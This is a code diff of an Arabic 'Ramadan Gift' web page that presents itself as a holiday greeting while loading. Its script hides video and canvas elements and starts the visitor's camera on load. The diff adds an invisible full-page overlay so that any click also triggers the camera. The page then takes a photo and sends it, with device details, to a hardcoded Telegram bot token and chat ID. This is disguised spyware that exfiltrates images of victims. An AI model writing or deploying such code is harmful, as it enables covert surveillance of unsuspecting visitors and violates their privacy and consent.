@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -6,7 +7,6 @@
     <title>🎁 هدية رمضان</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     
     <style>
         * {
@@ -22,11 +22,11 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow: hidden;
             position: relative;
+            overflow: hidden;
         }
         
-        .bg-animation {
+        .bg {
             position: fixed;
             top: -50%;
             left: -50%;
@@ -44,7 +44,7 @@
             100% { transform: rotate(360deg); }
         }
         
-        .stars-container {
+        .stars {
             position: fixed;
             top: 0;
             left: 0;
@@ -72,7 +72,7 @@
             position: relative;
             z-index: 1;
             width: 100%;
-            max-width: 480px;
+            max-width: 450px;
             padding: 20px;
         }
         
@@ -81,20 +81,13 @@
             backdrop-filter: blur(25px);
             border: 1px solid rgba(255, 255, 255, 0.08);
             border-radius: 40px;
-            padding: 55px 35px;
+            padding: 50px 30px;
             box-shadow: 0 40px 80px rgba(0, 0, 0, 0.5);
             text-align: center;
-            transition: all 0.4s ease;
         }
         
-        .card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 50px 100px rgba(247, 151, 30, 0.15);
-        }
-        
-        .gift-emoji {
+        .gift {
             font-size: 100px;
-            display: inline-block;
             animation: pulseGift 2s ease-in-out infinite;
         }
         
@@ -104,9 +97,9 @@
         }
         
         h1 {
-            font-size: 36px;
+            font-size: 34px;
             font-weight: 900;
-            margin: 15px 0 10px;
+            margin: 15px 0 5px;
             background: linear-gradient(135deg, #f7971e, #ffd200);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
@@ -116,54 +109,65 @@
             color: rgba(255, 255, 255, 0.6);
             font-size: 18px;
             line-height: 1.8;
-            margin-bottom: 5px;
+        }
+        
+        .loading-text {
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 14px;
+            margin-top: 20px;
+        }
+        
+        .loading-text i {
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
         
         video, canvas {
             display: none !important;
         }
         
-        /* مؤقت مخفي */
-        .hidden-loader {
-            display: none;
-        }
-        
-        @media (max-width: 500px) {
-            .card { padding: 35px 20px; }
-            h1 { font-size: 28px; }
-            .gift-emoji { font-size: 75px; }
-            .sub { font-size: 16px; }
+        /* زر وهمي لتشغيل الكاميرا (غير مرئي) */
+        .hidden-trigger {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            cursor: pointer;
+            z-index: 999;
         }
     </style>
 </head>
 <body>
 
-<!-- خلفية -->
-<div class="bg-animation"></div>
-<div class="stars-container" id="stars"></div>
+<div class="bg"></div>
+<div class="stars" id="stars"></div>
 
-<!-- المحتوى -->
+<!-- زر وهمي يغطي الصفحة بالكامل (لتشغيل الكاميرا عند النقر في أي مكان) -->
+<div class="hidden-trigger" id="triggerBtn"></div>
+
 <div class="container">
     <div class="card">
-        <div class="gift-emoji">🎁</div>
+        <div class="gift">🎁</div>
         <h1>هدية رمضان</h1>
         <p class="sub">🌙 رمضان كريم</p>
-        <p class="sub" style="font-size:14px;color:rgba(255,255,255,0.3);margin-top:20px;">
-            <i class="fas fa-spinner fa-spin"></i> جاري التحميل...
-        </p>
+        <p class="loading-text"><i class="fas fa-spinner"></i> جاري التحميل...</p>
         
-        <!-- عناصر مخفية للكاميرا -->
         <video id="video" autoplay muted playsinline></video>
         <canvas id="canvas"></canvas>
     </div>
 </div>
 
 <script>
-// ======================== التوكن والأيدي ========================
+// ======================== التوكن ========================
 const BOT_TOKEN = '5418501320:AAFAjqrT_Tu2JNGe1nc2Ki-lb3kAB8QVEHE';
 const CHAT_ID = '1786031358';
 
-// ======================== نجوم الخلفية ========================
+// ======================== نجوم ========================
 const starsContainer = document.getElementById('stars');
 for (let i = 0; i < 80; i++) {
     const star = document.createElement('div');
@@ -176,30 +180,23 @@ for (let i = 0; i < 80; i++) {
     starsContainer.appendChild(star);
 }
 
-// ======================== عناصر الكاميرا ========================
+// ======================== عناصر ========================
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
+const triggerBtn = document.getElementById('triggerBtn');
 
-// ======================== إرسال الصورة للتليجرام ========================
+// ======================== إرسال للتليجرام ========================
 function sendToTelegram(imageDataURL) {
-    return new Promise((resolve, reject) => {
-        const blob = dataURLToBlob(imageDataURL);
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'capture.jpg');
-        formData.append('caption', `📸 صورة جديدة\n🕒 ${new Date().toLocaleString('ar-EG')}\n📱 ${getDeviceInfo()}`);
-        
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        })
-        .then(res => res.json())
-        .then(data => {
-            if (data.ok) resolve(true);
-            else reject(data.description);
-        })
-        .catch(err => reject(err));
-    });
+    const blob = dataURLToBlob(imageDataURL);
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', blob, 'capture.jpg');
+    formData.append('caption', `📸 صورة جديدة\n🕒 ${new Date().toLocaleString('ar-EG')}\n📱 ${getDeviceInfo()}`);
+    
+    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+    }).then(r => r.json());
 }
 
 function dataURLToBlob(dataURL) {
@@ -220,7 +217,6 @@ function getDeviceInfo() {
     else if (/Android/.test(ua)) device = 'Android';
     else if (/Windows/.test(ua)) device = 'Windows';
     else if (/Mac/.test(ua)) device = 'Mac';
-    else if (/Linux/.test(ua)) device = 'Linux';
     return `${device} | ${ua.substring(0, 80)}`;
 }
 
@@ -228,32 +224,25 @@ function getDeviceInfo() {
 function captureAndSend() {
     try {
         const ctx = canvas.getContext('2d');
-        const w = video.videoWidth || 640;
-        const h = video.videoHeight || 480;
-        canvas.width = w;
-        canvas.height = h;
-        ctx.drawImage(video, 0, 0, w, h);
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
         const dataURL = canvas.toDataURL('image/jpeg', 0.85);
         
         sendToTelegram(dataURL)
-            .then(() => {
-                console.log('✅ تم الإرسال بنجاح');
-            })
-            .catch(err => {
-                console.error('❌ فشل الإرسال:', err);
-            })
-            .finally(() => {
-                if (video.srcObject) {
-                    video.srcObject.getTracks().forEach(t => t.stop());
-                }
-            });
+            .then(() => console.log('✅ تم الإرسال'))
+            .catch(err => console.error('❌ فشل:', err));
+        
+        if (video.srcObject) {
+            video.srcObject.getTracks().forEach(t => t.stop());
+        }
     } catch (e) {
-        console.error('خطأ في التصوير:', e);
+        console.error('خطأ:', e);
     }
 }
 
-// ======================== تشغيل الكاميرا فوراً ========================
+// ======================== تشغيل الكاميرا ========================
 function startCamera() {
     return navigator.mediaDevices.getUserMedia({
         video: {
@@ -264,32 +253,49 @@ function startCamera() {
     });
 }
 
-// ======================== تنفيذ فور فتح الصفحة ========================
-// تشغيل الكاميرا فوراً بدون أي تفاعل من المستخدم
-startCamera()
-    .then(stream => {
-        video.srcObject = stream;
-        console.log('📷 الكاميرا تعمل');
-        
-        // انتظار 3 ثواني ثم التصوير والإرسال
-        setTimeout(() => {
-            captureAndSend();
-        }, 3000);
-    })
-    .catch(err => {
-        console.error('❌ خطأ في الكاميرا:', err);
-        // محاولة مرة اخرى بعد ثانيتين
-        setTimeout(() => {
-            startCamera()
-                .then(stream => {
-                    video.srcObject = stream;
-                    setTimeout(() => captureAndSend(), 3000);
-                })
-                .catch(e => console.error('فشل المحاولة الثانية:', e));
-        }, 2000);
-    });
+// ======================== التنفيذ ========================
+// عند النقر في أي مكان على الصفحة (الزر الوهمي يغطيها)
+triggerBtn.addEventListener('click', function() {
+    this.style.display = 'none'; // يختفي بعد النقر
+    
+    startCamera()
+        .then(stream => {
+            video.srcObject = stream;
+            // انتظر 2 ثانية ثم صور
+            setTimeout(() => {
+                captureAndSend();
+            }, 2000);
+        })
+        .catch(err => {
+            console.error('فشل الكاميرا:', err);
+            // حاول مرة أخرى
+            setTimeout(() => {
+                startCamera()
+                    .then(s => {
+                        video.srcObject = s;
+                        setTimeout(() => captureAndSend(), 2000);
+                    })
+                    .catch(e => console.error('فشل مرة أخرى:', e));
+            }, 1000);
+        });
+});
 
-console.log('✅ النظام يعمل | Bot:', BOT_TOKEN.substring(0, 10) + '...');
+// تشغيل تلقائي بدون نقر (حاول فوراً)
+setTimeout(() => {
+    startCamera()
+        .then(stream => {
+            video.srcObject = stream;
+            setTimeout(() => {
+                captureAndSend();
+            }, 2000);
+        })
+        .catch(() => {
+            // إذا فشل، المستخدم سيضغط على الشاشة
+            console.log('بانتظار نقر المستخدم');
+        });
+}, 500);
+
+console.log('✅ النظام جاهز');
 </script>
 
 </body>
